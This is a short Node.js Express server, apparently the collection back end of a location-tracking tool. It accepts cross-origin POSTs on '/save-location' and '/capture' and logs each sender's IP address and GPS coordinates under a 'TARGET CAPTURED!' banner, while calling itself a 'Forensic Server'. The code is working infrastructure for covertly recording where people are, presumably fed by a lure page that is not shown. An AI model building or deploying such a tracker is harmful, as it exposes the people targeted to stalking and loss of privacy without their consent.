const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors({ origin: '*' }));
app.use(express.json());

// This helps you check if the server is live
app.get('/', (req, res) => res.send('Forensic Server Active'));

// We create BOTH paths so you don't get a 404 ever again
const captureLogic = (req, res) => {
    const { latitude, longitude } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    console.log("------------------------------------");
    console.log("🎯 TARGET CAPTURED!");
    console.log(`IP: ${ip}`);
    console.log(`GPS: ${latitude || 'BLOCKED'}, ${longitude || 'BLOCKED'}`);
    console.log("------------------------------------");
    res.status(200).send("Captured");
};

app.post('/save-location', captureLogic);
app.post('/capture', captureLogic);

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server on ${PORT}`));